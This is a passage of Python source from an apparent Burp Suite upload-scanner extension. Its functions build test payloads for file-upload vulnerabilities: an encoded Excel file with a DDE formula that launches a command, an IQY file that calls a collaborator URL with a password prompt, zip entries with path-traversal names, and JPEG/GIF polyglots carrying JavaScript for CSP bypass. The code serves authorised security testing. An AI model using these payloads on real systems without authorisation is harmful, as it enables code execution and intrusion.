                             'c77f3znnd9Y5z6PhpsKjA8fV2wBO7IEY+MGUBGQuHQEepuwbeQC/ZzLRJfvTBB5MkfyfEkkKLEiyOFCcUi9RC4iATAGgDX6WkKrgGYDH8JgP4gAJgMR' \
                             '4OoP6r5LJmA3BBGTDReh4dvCKAPKgVgGoYZYpYufh2PkYFq4cO9vBbzCZEadi0+u3c4mTsHCbsfMY7DwMIMTTWJy/MI0p0AT34ScFbEWuTgRjJAhOIB' \
                             'hEg4UgBDDg+X9bCMkBQhCAAygnCg9hMUAI1BYMxEIZAIMIVAZMi8KAISYOGEJJSIjxIBJ+Z9UXQhYXggrc4DkCRIIEDI9GIMDQwtJFGjAEypuBQgBYA' \
                             'gOlS2rAEpDsl0WTRAXiQAO6/VSG0Zj51LG0sWNNbHtv5htit5okHdjSU3Fh/L3pYQH4gLpAAozmDWhkgseDGk2SAXQLXf6QAlCx4E6whOwBCKL2fjee' \
                             'FSWIasul6o3AqxxjOAZTTAqiapKMwDj4B2G44/NGxMWYAWhgKj8xNEogN58egjk4cOCsgAHqJYPwOHwAuJiPoPci+cSkcvW5FzG9OFv/UaT/79AjIQC' \
                             'ufCbiwp/s1ZP29qM/1o8+sx/9nn70v/ajP9yP/ugQ7dnZj/7IEPGHGv6/y57j/ejPYnpyP+H59WX96E/3oz/Rj/5CP3qWPRJs/XYFhUqtSi12eilc+l' \
                             '3Su6Q5+TCOpe/pxen1T0m+8Kz8lGLrb8MmHhxXZYeXBoL9XIbPTrZfGQjklR2oXPIUFJSllaU5/iwpEGcYH04Rppfrx055Tro8AUjrS5cCjx4os/WKH' \
                             'D1VoB6HP5wTfgG8VOe0DzSB9ovDvkiQXqkf/BF95RUezir309RkihJIpgAusQfWPbrtKRRDkMKjR0KEea8E51ysWRa7hxgGLSHyRyAMNQJxqBHEhhqB' \
                             'NNQI4kONQB5qBImhRqAMNYLkUCNIDTWC9FAjyAw1guxQIwwbagS5gSI44iKg1kCs/wgk7At6OHI59gCMH0RhcCDiQkEUBwdCFgoyfHAgEkJBlAYHQhE' \
                             'KMmJwIJJCQZQHA1LnJrx0VAYHIrx0VAcHIrx01AYHIrx01AcHIrx0NAYHIrx0Rg4GxMxceOmMGhyI8NLRHByI8NLRGhyI8NKhDg5EeOmMHhyI8NIZww' \
                             'MCBIOwOtP+QcYODkR46WgPDkR46egMDkR46egODkR46egNDoS3dLJxIPqYrQgEjZccHByYfCDoi/fv3zPZIBJcgdlLlxQBOkkuHZtOSoCO36hxPEZ9T' \
                             'QGDNyo1NZXPKG6dJJcObxS3jr9LHw8G6NLxqTDAZW2S4FQw63L/B1MxG2cUDaCq1m8qJATURgqXjm0Af/YY9mUP24gBRjxGgO2+KAKc2wnOnitdN5gc' \
                             '98WzGg9UKHhWEx7WPN9+WJkdecz+K41pX8n22y5iIMw6vpItLS3lK1lunSSXDl+y3Dr+rDAbalaY82YFIPeTFTXCCsCCh1UMx0rgZ7UE3K0WPgKRIsA' \
                             'B+UGsBgPCdBAOYj0YEPywAZ9+G6HpF5DrE3hyna9tY/sEM40gJNd/Gqis8RFshxphIuCuztDt8NUZXyfsAHedAHgGtjcdPHjwf6wj2UYcDudRcK5mZk' \
                             'LVoRpSHaOW02MSTHMoM0EOl60EkiZzGKwuJnCQpAMPQ3g4giiwHNBBDPZDCCohApxWSpDo4Q86upni6JqARWbqoNQgJgU+JjN+pjFCmcw4TOL08O9P7' \
                             'whmUuRjMudn0hXKZM5hItPDX79+LZhpOB+TBT/TeKFMFhwmCXo4832dYCYlPiZLfiYjoUyWHCYKPbyl7b1gphF8TFb8TGZCmaw4TJL08MddfwlmUkZM' \
                             'FgP4nhZkshiU79W5Vdx9I5hJhY9JgO+NFcrE7Xt1bj3XiwQzqfIxCfA9PaFM3L5X59ba2iqYSY2PSYDvGQhl4va9Ojfm81zBTOp8TAJ8z1goE7fv1bm' \
                             'dvPJCMJMGH5MA3zMXysTte3VuVx6dFMw0EjFZDeB7VMhkNSjfMzPfW/1cMNMoPiYBvqctlInb98zMP5ZkCGbS5GMS4Hv6Qpm4fc/MvLa2VjCTFh+TAN' \
                             '+jCWXi9j0zc2ZLuGAmKh+TAN8zEcrE7Xtm5lmH+qlPo/mYBPiehVAmbt8zMz/UkCWISQbO8OFst8/pHHEUo5gS/boZAP57m1mggLWPqg90LAfUjB90N' \
                             'A6U26MAeJ1iKhhUmwNqzg+qgwPldh7WyEUgqA4H1IIfdBwOlNtPINBFIBhUlwNqyQ9qiAPldgkApjAuCwbV44Ba8YOa4kC5Sx+AuCIXwaD6GGhifERw' \
                             'CD2HsowXlDgCA00E8SACTvFCIDQaJiJQcSZrBi/ee41GchgoGTouW0GAgbnvKDx3kjx324hyYBz6uWEynUEPjYxJjInIoaTi7FFmSoHJ0AoGPEJBJEx' \
                             'oIjwi+rUKDdB5rEIzW45VrDsKz50kz902OPQdn0Zm5lBovKaIk5nSYAo0YzlYCBZj21eowB/WxQDse5S1BihrnRfGCM5aJZi1zjBujMCsRcsKnKxN+q' \
                             '8mQhbQ0HKUMyOCHhKzMD6H4sNrjZgakwKtYUBb6NCWGGhXPEDTOL4WA9nArvksG9h3ZMgzAjZC8ognKvopgx4TRmdQZ9GXJuRQXHCpt2TKY3xRMN+eY' \
                             'sUZA8KwgqWCWfBzKfRgNIVh5wFKSK/PUoARmqS4JELYCbywBHWmGHCBPpHQ5/woMlqEYAOhlYpeIBIwThODJUvFlawYDDwDxMJSReXKLk0TVJoe9MQE' \
                             'RnA0X+0jjISl6QHtRtQMzBu4DUDrEWwD0KJFrwFSsDWF7Z1HbMLC5TmUMFwWScEoHtCMBFgYywFaHe2DY9Yx2b6AVhU4vsC6o/DcSfLcoWSbpYnDZGv' \
                             'jki0Ok+AJjY/ta0JYSZeFLSkM6BMaGQ3rJcx0J1zaNaDv+GDVMbq3WvJmP1qC6Es9IHOyH6QBaIc1Dg5gcAkwE5FLBEOLwvpcAdd5ycP2WBqA+yF0Rn' \
                             'xoJGNhOLTODufZcrCe3sfqFwP6NLIObTEL5/IvCehNU2YtwkAJ24iKsD2W5QGl8g/GxOSZsv3AUnv7SDw0kbuyiANEZIUn4h+LiSkIITITRsR0OFrX3' \
                             'ktkjSfiH4qJKQohMhdGxBptEjEiGzwRf58qNlwIkYXAUiGilmUCalnm0BlRMd/jwhPoVD96dDRsV2fjqo0qbFnmYNhR0IG+gzgMmQ6x/eA5GvNRdmJ4' \
                             'ugh2HUJrN2SsnvyURhJQT0iwnvjCRguZze59ABbeNk1CQEchAR2QNzxvRzEcTERjPd9gRgx3i4mrZURpONbzxapDzICtJZNTRUYAO5RvWGZRv8OCiWN' \
                             '8D6fH5FA24vBVYL5xcogKc45VQnHw+A7zEHFy91ACB1TcnT+Zp/Mn83T+ZJ7OnwyyKHPhwTFnK0A/hyvAxKGuERmEWoRl2JU7PMKgwyTC5tkMtlgLQR' \
                             'LWSnJCcO+KtQILsP3Sa2AuuKFlMWjHLNghw+ww3UNRBXu4M4HrM58iDw/AI5tgh2gKBynFBBIMQyAVE9BP9jIAhC4OE6MaO1FDg6NDx8IxzONUgJWHo' \
                             '8lYONlvx+7kgE9C2JTY0MTFcPzmEbyYrtK7n/sH80fvGlgVgQIP2EUlE2GWc8iZMBwFhFKU4cGxRrn3kwh2UqRkd3J9cySNCDxniJHQri+kHg1e/S1X' \
                             'iUhGElk/7vs7xcYkQDuCZi2Lo8cHGC1dHH00+7rHJRN55+5p39OfGbrmlU6i6LxaXZNV81vyxau52sq190oLZn/rdmucNbmQqhxNazHv3mf7hFGhJVF' \
                             '2aXdegeux95MNtDs0XAIOPrSe2VI0J3OVuurE4INyuz+eu1Cub70ubXrmHu+DK57HRbiV2mVtZWht/b3xqw3xumWSbto/acPqE73uq3ZkZts8qXW6+0' \
                             'zsVMmouXZvnn3Zrf1468lzDlYeR12dKOknLubc7iz8MrVWebLRtbN6n4x+N8g8UD+vetYXtZKXgXTLW5aFf1PfS29SvFQikxl0M4KqZvi80nZfZmfrn' \
                             'XnR5Q+ySrOSrQLrPKqYSgs+Obwc3lSX6p9KRO4rhsuvg3cKXlyEV1YE1oaWIAY9Ot7YCJ0zttxcdMlEZl3Xmor0WylejZdUdZKMD251Ms5PAW36qZFj' \
                             'NFo1Olpn1pClzlMyfu/qPmT3o3jjl7btL6jKew6TLz12crge2ZZkV5m6unbN7wU6FP+lcWvzV7SWBZV73sqfWG+qcXDaKZMdinLrW2aWexdPDrtVK9/' \
                             'o6txqEaKdWpD9c9Bdrd371B5ZuTV9Uva+a72geEthLfPEJZO6fTOrUo/RnjmTYqy3uy18GnKg0PiJT8XWQvrh25oNZWe+3PmHICihUct2KqfDqw2A9U' \
                             'N8QiR9Md2Y6+weHBMcQWcgD5Gpc5e6RJWf1JZyYMnWFuvQ8/rOIaXXi89/Bk556o41+xt/bb377Em69Y2HSs17Z8jOo+VJyG6g1xutP/02mVagUfjXt' \
                             'JF/0qLbakY8f7VUtfbk5uEPp1+N90oZ27x1TVHZA+qdMoPm0V20B4FntRfZbXTxfdnUPe6xc4eBrhTRRrDx1l81zVZLoB1trNrAZ7wpMrtzXv1GDRfl' \
                             'SuOnqZFfjTqO+Gul0/NnzuxUa51b6pRl6T09YF+7kdfsPcdN1i749XNpyVbZsyTG9dE0jWlU3V3fTcl7tb+5dB5pn7Nkx6zSCPKJsF1qVQ0BXyt8K5d' \
                             '3Na+YOds61mHjoSVrz1Jpr3qaNUY8vFS7vX5a6cueLXr53te7M6bUynjtfJRVeaW6MqVjW+X9KRJm1aafJ9krSBQ+cfE2krtGN10TrB1TouPx6PyEJ6' \
                             'Y5b6+pPFNzebHf+o9nfgcb9WvWa1/YtV/1tv3um7VK305bLVqnlKDnXbhq3LPQg0pdIREFs9fIR90quG/rdPLJJRnzJPuqm793eWlrJ996Z/D1pvHDc' \
                             '/OmSuTK71gRJns2+8f1p2arWha636xV0fvyu6M8eXNMcZBY4f0/ZfdeulKS3dEELH6pdvUx+uNGyd03stUyUWmNLuveOMZ7HvNb6pSasi7eepaW9DHH' \
                             'Qz8WSDiof6raoByY7p18Jl1udXiR1tylsq7vNo9KPtE4iuQOAyno1L4adk7Rqv2f+kXxV/NuOemVjyLnhxv6BO6nqr9/6e1TN29M959+m/aZ2RPTiN7' \
                             'a0x/XflK8eUvp8ekt+hPaLtuO2UghxmYq6i44431k0/jEnmP2q1Y2KjtKqKo1blAxUbB12rBF7488Gr2mUtovRez9508d1sapyz+8f2F9LLBi2Zdj0T' \
                             'FF13Jsp9RWb//25Hwl89te4/KHqd8/bzFmZntUbFbR/fHAgfn1za6ghwWac+bvfvza16H826t1p4OYr093VSZEdjESQqr1tK9Un99ys8KFtlb8p54nw' \
                             '1dOyJyesV5n1ZiG155227PFyyun3l7TEdyaMdMmTE3l7Y32Q38mjny3Qzsrt8v5uPjE8E2fVZeoP9q353rJ27AdtPvbPuzIXJHRkBv1xt6VJiHnO2Pa' \
                             'scsHS7WCNz532qCYqWxT1ejz8LjPplFHvuXJXy+uCbuWuyD+VYpHueYYj21uVzNHTFvTMDqzyjhKxTGujL73iV7gFq+7hyV66qZWn5p023Hl6kP0K7a' \
                             'ROl6d3hMcTS1lV2aEPR0zIfDDoUwNKcl9gQuulbfJSLflLLsYXLG2qctx7c/n/9ldHKpRqzMh8dXEyZtyrxJsX7voB54rCc2ZovvZ52ep0RvK17mde1' \
                             'RT9/fo9lHf03Iq3qycXPLsjZze6pqt891dndMKY+fcb7tuu3veO9vApgnVxbSmZ8d3BJzPs8nPP+0390BKhqnzi8i1x7t7fCTSNf39rIynPdxMPTIyx' \
                             'HfBA+eko4e7SdKdry6EWztrKgSv6VQ1vqdpX9NRdPnE1Ombeuzru6s6/qhf5/ks79BHwi/79lz8RlJ3WK9S4KVJaQgmdQcWyY0Nazb6ZHT/3bnnO5lG' \
                             'pTULguzLIucvCFotc+GkjHaSz/OKU7nURe6epDqSY3qb62lqyNlKea/E2RuL8hjxK5qUY9KuXG1fEpKTXPKlZdGKaqZH65N7DK2Ctp8NTnnf0fH/JWX' \
                             'cs7gjVS3rvmlFR5Ejd0y87Dk9Kf5Oom/8g+YeZndA/YWK5AfXOztsileoaS3f1BGoazvvi02F260LkyLyPWwbfTRTng/vsnufO9y1huH+LruhwJ648l' \
                             'bdVJPCpx8d9W5sAbsUJh42kxg+94y4i9+VJ24rp4ZZZDUoZq09fMG7VD63fc3bnW4XM7M1k9rnLD23YUsLze7V0TnNh8L95onn/LlUp66mbbvrHy+nn' \
                             'rCpuN4cdUo65dq50fvDjJ2qd9fpei3ZGhlD3pH9MddItd5x8rHO/JJI27knt3/dfCRpLii7b/B2W2u6VvsoB5lJpIxHJsP++pD73qe9ffOSMnOHPwq6' \
                             '1Zo2gMjj1gqeS88VnXkTsM8vQH2RytuTztUU670ZpzbFvJ1Ccsg48XJWvsqBn+cFnZbe5fdx+7iPyfJ+4pvDO1Joxe1RW1tvyFqYmou7l3/Ieli4Tt7' \
                             'M52RnT7yN6dqapZLHx94+ZjRFJa7NbMfEB299a2kzjJ6CTH3LMx4/LbRan3n5fr72m55FX85qRP4Wv/75nCLHyT1NOVFOfl9OZIsVtHpc+TBhn2vT6y' \
                             'vrSxO+SqnZ14+4EVvW01zlmlN08cGTyKQ3vzSMSM2gXq4On60WN5U0f+Qsn6gblPsZzzKPrq8sqt5+MODDeNcaz5+yXppNnudsum2Z1N1DEwvyHzI0V' \
                             'GNb9lTtXzu9dPLSUk/xOxaHZ7t/OJzNuOef6ED7nRahXf8bzHrn2e5LlE+E39u+ytA/sOiqxlEr3bV54XN6LBJjC+5/1r27+JPksh0g/cXn+FkPpJVI' \
                             '6X6muc7upn+7XxofEZGf9Poe7a3YbSNv7U1HH94rfFDqHzg2r6nq0Y7xDlcXuxjK1FunHDx18gLNOraspdZnmqbYS4bvLKnXrmdOPKeo/3b8zfTGkwT' \
                             '/p7l1p8gTlxl4/PTjg+s92a9lJUGHT1YHjyuU2OFt0HlnxgOTo77rgsvMXjYHTgrO9pov27Txq8L84IbEpIBjNUuKO5/UG9ZvHrfxultQ7S7Ln1PoQU' \
                             'UTijsrMs/ldtsRp79Ylm+16G5rxdRDAV1ZrlX7744v+7Y5cGHDS2uJfEeH6DIX4+Qut/T0mAoti7VF3vl/de1aPdX5VmzZjPr9czrI9TFRqglBYYtlj' \
                             'k5018o1vFi+524REwjqtWVvbf31FLzSILA2QXH32qxxFn7g0TvucpeqNlHK6F69hBIb23ROPlv3wfqGottiGU8tZa0ctL06X8sW0yhG64Iv5C48v+uX' \
                             '2uGhZn+bRh5Wp/z0asfPe6oWn+nMmuSt7JHZYhtWsmB1Vqz16xER2TP03XW1vfWNTHczhum5bstr2DDrS1qxTf6WOU/H5P/hePV8w7TuxJT97/YSkv/' \
                             'UrgiRX9EM1HZ67mGe+MdGPTPCWEs54IeXY3zLGnH9367UPRq797Ab6Zr/uXOXH/YlnUA0BP0PxHlFwLAcD4AfmXLEhMAzTsVHxI/0OKJGFD7uwyPhh1' \
                             '0cuSMIyVQQBt4JuCZZUoN2Cc8Z4tjD3uLwLwACrcMyZC+cue3Fzeo2Qd0m3GwO7WxnPUssz/MssTRRiSduiB0AlXZo2zkRm/wS4exTDrtWwPYwyMMkf' \
                             'T/0rtE9xNMhCNOPx/QG2Hk1pknjms3poJUvQCOsgt9UkRAX2uScjoXOwM66MHQ4Js8d9Liu9eG1v0VxbZjZK4dxXNcHsF2a6OlP9EfC5n/mmDQ5sD/l' \
                             'KvMouiAPlwfcMtGcfTUbWiEFUrCd+QBoq8mx9ngRh/XlCetMIcr3XtN6lXKwgEdhl3LYE7SoEmC33yXAPFakuzCIJaazJyqCU1gBTuIyYyMsko08ZhI' \
                             'hpBx7Xwp7jh5BUYEHdyACWoUQm8IqWJH82wpaLSFjazq8gjzj0Zpf33+ZGSl/JJsCDPROtKD9gvsBaz8v+n4SYO1NmwZY23PnAtYTE5GA9RxKGmA9Xr' \
                             'IJsJrn3YD1JNJTEmt3OIqDXiqA+ATdo/rgvjCUERsfG55AdV4aSo/GONNu6fpqezUSsGtyio0lvGZvtBKJSEQiEpGIRCQiEYlIRCISkYhEJPwibP5Pb' \
                             'K5vzjPSkN+2C87/aV+K0fz/KmA9RYu+R69kQS93QPN+tDqFdpahRUO0XQ/N3dE2GjTvTwaspc0MwFkPQOsDBwDvegCpl5s1l5fvW5Ht71NTnmUHsoe9' \
                             'CwXIyLNANXuNc2SE0BcmxIdEP01IoDP6HvkSiUhEIhKRiEQkIhGJSEQiEpGI5P+TYPN8APreM4PeGoZ2kaDf+NHv8WhujbaAoDk3mrOj+TvauYKm1mi' \
                             'Oj57ZQL/5o3k+e/cNmuuj9QD0fj70ej30djz0cju0UQrtZ0FTc/RiN/R/I9Br1dB+G/RSM/ROMvRKMfRGML3e79Hrr9DbptALpND7mtCrldDbkox7v/' \
                             '8HHj/+tf8y4d9KvEEs9rwPFThjTykywLIh+Y8yECewsZAfUSmstaSLrK+ncoeNc3DpkVzZSGD/vxAkvpAdPVwWgtkRNSRuJIqASOBOz2Dj6dizPsWBD' \
                             '/bs02LsYbBlYDrMhXDMJqRBT4vGYo9q9Sf6kB/VIVR/BstPRSd5Nv8UyBCK2cB6TnRo9tj8J9Kvz8X/H9O3feQ='
            content_excel = content_excel.decode("base64").decode("zlib")
            title = "Malicious Excel upload/download"
            desc = "An Excel spreadsheet with the content =cmd|' /C calc'!A0 in the first cell was uploaded and " \
                   "downloaded. When this spreadsheet is opened in Microsoft Excel, and the user confirms several " \
                   "dialogues warning about code execution, the Windows calculator will open (RCE). See " \
                   "https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/ for more details."
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "Low")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content_excel))
            self._send_simple(injector, self.EXCEL_TYPES, basename, content_excel, redownload=True)
            # TODO feature: Burp collaborator based for Excel format...

        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "IqyExcel"
        title = "Malicious IQY upload/download"
        desc = 'A IQY file with the content pointing to a URL was uploaded and downloaded. When this file is opened in ' \
               'Microsoft Excel, and the user confirms dialogues warning or the server automatically parses it, a ' \
               'server is contacted. See https://twitter.com/subTee/status/631509345918783489 for more details.'
        content = 'WEB\r\n1\r\n{}["a","Please Enter Your Password"]'.format(BurpExtender.MARKER_COLLAB_URL)
        issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "Low")
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=content))
        self._send_simple(injector, self.IQY_TYPES, basename + "Mal", content, redownload=True)
        if burp_colab:
            # Also do collaborator based:
            desc += "<br>In this case we actually detected that interactions took place, meaning the server executed " \
                    "the payload. Interactions: <br><br>"
            issue = self._create_issue_template(injector.get_brr(), "Malicious IQY Collaborator Interaction", desc, "Firm", "High")
            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.IQY_TYPES, basename + "Colab",
                                                       content, issue, redownload=True))

        # TODO Burp API limitation: We could include a Link in a spreadsheet document and hope/wait for someone
        # to click and then detect it via Burp Collaborator. However, as long as we have the Burp API limitation
        # of not being able to keep collaborator interactions for a long time as an extension, there is no point.
        return colab_tests

    def _path_traversal_archives(self, injector):
        # TODO feature: Check if there is anything we could do better and look at
        # https://github.com/portswigger/file-upload-traverser

        # good implementations for zip unpacking (such as unzip) give a warning such as the following:
        # warning:  skipped "../" path component(s) in ../../1DownloadMeinfo
        if injector.opts.file_formats['zip'].isSelected():
            basename = self.FILE_START + "ZipPathTraversal"
            filecontent = "Upload Scanner Burp Extension ZIP path traversal proof file. If you find this file " \
                          "somewhere where no files should be unpacked to, you have a vulnerability in handling " \
                          "zip file names that include ../ ."
            files = [
                ("../" + BurpExtender.DOWNLOAD_ME + "info1", filecontent),
                ("../../" + BurpExtender.DOWNLOAD_ME + "info2", filecontent),
                ("../../../" + BurpExtender.DOWNLOAD_ME + "info3", filecontent),
                ("../../../../../../../../../../../var/www/" + BurpExtender.DOWNLOAD_ME + "info4", filecontent),

                ("info/../../../" + BurpExtender.DOWNLOAD_ME + "info5", filecontent),

                ("\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f" + BurpExtender.DOWNLOAD_ME + "info6", filecontent),
                ("info\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f" + BurpExtender.DOWNLOAD_ME + "info7", filecontent),

                ("%2e%2e%2f%2e%2e%2f%2e%2e%2f" + BurpExtender.DOWNLOAD_ME + "info8", filecontent),
                ("info%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f" + BurpExtender.DOWNLOAD_ME + "info9", filecontent),

                # ("../../../../../../../../../../../usr/var/www/" + self._download_me + "info10", filecontent),
                # ("../../../../../../../../../../../Local/Library/WebServer/" + self._download_me + "info11", filecontent),
                # ("../../../../../../../../../../../usr/local/apache2/" + self._download_me + "info12", filecontent),
                # ("../../../../../../../../../../../usr/local/httpd/" + self._download_me + "info13", filecontent),
                # ("../../../../../../../../../../../usr/apache/" + self._download_me + "info14", filecontent),
                # ("../../../../../../../../../../../srv/" + self._download_me + "info15", filecontent)
            ]
            title = "File path traversal"
            desc = 'A zip file was uploaded that includes several filenames that start with ../ such as ' \
                    '../../proof.txt . It was detected that a file with the exact same file content was downloaded again. ' \
                    'You might also want to check if it is returned with content-type text/html, which might lead to XSS.'
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "Medium")
            # TODO feature: is there any way we can support the user to access those proof files? Maybe just search for it?
            for f in files:
                content = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool).create_zip([f, ])
                # If we check for the entire content to not be included, these will match eacht other
                # However, if we require that PK is not in the response, then it won't match any of the zip files
                self.dl_matchers.add(DownloadMatcher(issue, filecontent=filecontent, not_in_filecontent="PK"))
                self._send_simple(injector, self.ZIP_TYPES, basename, content)

    def _polyglot(self, injector, burp_colab):
        colab_tests = []

        # While I thought about implementing a GIFAR payload, I don't think it is worth doing nowadays

        if injector.opts.file_formats['jpeg'].isSelected():
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "PolyJpegCsp"
            content = '/9j/4Ak6SkZJRi8qAQEASABI'
            content += 3096 * "A"  # the nulls in the header base64 encode to A...
            content += 'Ki89YWxlcnQoIkJ1cnAgcm9ja3MuIik7Lyr/2wBDAB4UFhoWEx4aGBohHx4jLEowLCkpLFtBRDZKa15xb2leaGZ2haqQdn6hgGZolMqWobC1v8C/c4' \
                      '7R4M+53qq7v7f/2wBDAR8hISwnLFcwMFe3emh6t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7f/wAARCABE' \
                      'AEQDAREAAhEBAxEB/8QAGgAAAwEBAQEAAAAAAAAAAAAAAAIEBQMGAf/EADEQAAEDAgEKBQQDAQAAAAAAAAEAAgMEEZEFEhMhMTNBUVKBFBUiU9EyYX' \
                      'GhNEJzsf/EABgBAQEBAQEAAAAAAAAAAAAAAAADBAEC/8QAHxEBAAICAwEBAQEAAAAAAAAAAAEDAhESMTITIVFB/9oADAMBAAIRAxEAPwCfSye4/FAa' \
                      'WT3H4oDSye4/FB2pJJDVwgvcRnt4/dBq5ScWujsSNR2FQunpopiJ2kD39TsVn3K+oMHu6jim5NQYPd1HFc3JqF9GSYdZvrWqnyy2+nmlZIIBBs5Mox' \
                      'Tx+Jn1OtcA/wBR8pM6/XYjc6hyqJzPJnbGjYFjzy5S24YcY0QKb0YIGC4L6Lc91rp8sl3p5tWSCDSyVQ6RwnlHoH0g8Sg61tVpn5jD6B+1msz3+Q11' \
                      'V8Y3PaYKKxwuOGCBguC+i3Pda6fLJd6ebVkjQ6PSN02dmX15u0oNhuV6VrQ1scgAFgA0fKBo8qU0kjWNjku4gC7Rx7po2MpgB0dhwKz3f400dSkCzr' \
                      'mCBguC+i3Pda6fLJd6ebVkggEHWj/lwf6N/wCoNrKEb5HMzGl1gb2ChbjM60vTlEb2lFPN7bsFHhl/F+eP9Do3sF3NIH3C8zjMdkZRPQC8vS+i3Pda' \
                      '6fLJd6ebVkggEDRPMUrJALlrg634QaPnUnssxQaUErzT6WdojO23ILkzERuXYiZnUIZ5jM+51AbAsWefKWzDDjBQvD2votz3WunyyXenm1ZIIBAINL' \
                      'JVDnkVEo9A+kHj90FFXUaV2a0+gftZLM+U6jprrw4xue3AKSpguC+i3Pda6fLJd6ebVkggEHSnYJKiJjtbXPAOKDbr5DFGyJgzWkcOXJRuymI0vTjE' \
                      'zuUIWVpMEDBcF9Fue610+WS70z/LIeqTEfCskPLIeqTEfCA8sh6pMR8IHhydEyZjw592uBFyOf4QW1UDZi0uJFuSnnjGXatec49OHg4+bsVP5Qp9ZN' \
                      '4SPm7Fc+UOfWX3wrObk+UH1lRAwRssL2vxVsMYxjUJKi8vL//Z'
            content = content.decode("base64")
            types = {
                # ('', self._marker_orig_ext, ''),
                ('', BurpExtender.MARKER_ORIG_EXT, 'image/jpeg'),
                ('', '.jpg', ''),
                ('', '.jpg', 'image/jpeg'),
            }
            title = "CSP Bypass"
            desc = 'A file that is a jpeg and a JavaScript file at the same time can be uploaded, which allows CSP bypasses. See ' \
                    'http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html for details.'
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "Low")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content, check_not_content_disposition=True))
            self._send_simple(injector, types, basename, content, redownload=True)

        if injector.opts.file_formats['gif'].isSelected():
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "PolyGifCsp"
            content = 'R0lGODlhPSAnIKUkAAAAACgAAFkAAGRkZICAgI6OjpaWlpmZmaoAAKqqqrwAAL+/v8YAAMvLy8wAANQAANsAANsxMd7e3t8/P+JRUeNbW+Zqaufn5+h' \
                      '7e+uHh+uKiu2UlPGrq/KxsfS+vvTDw/fNzfnc3Prh4f39/f' + 111 * "/"
            content += 'yH+Jztkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgianNvdXRwdXQiKS5pbm5lckhUTUwgPSAiVGhpbmtGdSByZWNrb25zIENhamEgaXMgcmF0aGVyIG5' \
                      'lYXQuIjsgLyogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAQgICAgACwAAAAAjwBYAAAG/' \
                      'sCRcEgsGo/IpHLJbDqfxod0Cq1ar9isVjjtSrfgsHiM9HrJ6LTaaTav33B12x2v27Pz7n3Pb+b1fYGCQ1QjbYOIfYBchYmOdY2PknuLk5ZxlZeaaZm' \
                      'bnmBnn6KgnaOmT6Wnqkqhq65Lra+yUamzr7G2s3S5tru8sr6/rrjCqsHFp8fIo8rLn83Om9BQANXW19jYRtZaIhUdIGvcWIdb2efoAETaVxMR7xEYa' \
                      'exW5Vnp+OznVhgV/v4URJDZV4+YlXwI1Y0g+KSBhQwQI3IYmO3KNCcJ8wlh6GSBhg4gQ3qgSA/VxSYZ0w3h2OTCxBAwRYQjea2gwYMpS7J0smFI/og' \
                      'OaHYysRe0ohKW1Zp8ECLwiMJtT5EI3VjmJJapKyuqvEIPnVSjRUoyqgUG68acSaGOy1oTodqaYcEasnpVrlO0adfpxBt1oV2vhOhytfsWrd69fA/DP' \
                      'cvxD9Gxke6KLZxT8Vq/idkuxkfEMbHHlPuGzmg5L+bMp8dxDuw58tybmi9LBrs6tenVtffVhlxoDi3YjBd/JQzYdtTisdcaLlIOtO+jhONONv6Uo9D' \
                      'ilX8Dcn7SrPHZm+VeZ5iyaijuwIPLDg1eufjo2BOa3/74OfTppUVTT34cPnnS2vV2DGjt6ZdfgdW9N1188gX4xWudEMjefcLxlyBiFarnHoCd/rlhH' \
                      '2+uFbjEeLQpmOF+GqqzFWt6oEfWgRSuh+J3/CFYI3VR0VGfhBMmQWJXJsrIIFyrNedLHoH5GB2M0gGJoZD/OWnUIR8i+ZqS+N3YZHhPmmahljhCSAV' \
                      'RVoYIpoijgfkjlxWmo+ObSJLl3ZobCkdnXkihA2ecf4y45JkpXminfyVOdk4Au/QpZno0YnmibUw2umV/C2IjQKL2WclElpY56qWhj0La6XDVKHDkZ' \
                      '4xK94SMcSk53KYGsqrXotEY08oBBwyB6wi49rrrr7nWismtvBarqxC/HhussGvs0iuvuxoLbK7PMttsJdRGiyyy1CprrRyxPFttsNNK+y0aUoKdy0e' \
                      '66t6RaruKvAhvIO/O66689lJiZr6C4MuvHf7+C0fAAr9BcMHgPoDwvZHsu/AYRj748LWOTTywZxYbXHHGFH/IMbqafpxwvSKTc3AYQQAAIf4qLyAvL' \
                      'yAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgBCAgICAAOw=='
            content = content.decode("base64")
            types = {
                # ('', self._marker_orig_ext, ''),
                ('', BurpExtender.MARKER_ORIG_EXT, 'image/gif'),
                ('', '.gif', ''),
                ('', '.gif', 'image/gif'),
            }
            title = "CSP Bypass"
            desc = 'A file that is a gif and a JavaScript file at the same time can be uploaded, which allows CSP bypasses. See ' \
                    'http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html for details, but this PoC polyglot ' \
                    'was taken from http://www.thinkfu.com/blog/gifjavascript-polyglots . Note that this PoC only works if the HTML page ' \
                    'includes a HTML id named "jsoutput" where the innerHTML attribute can be set. '
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "Low")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content, check_not_content_disposition=True))
            # The image was once actually transformed but stayed nearly a valid GIF and a JS file, so we try to match for this true
            # positive as well because I *believe* such a transformation can be turned into a CSP bypass as well
            alternative_issue = issue.create_copy()
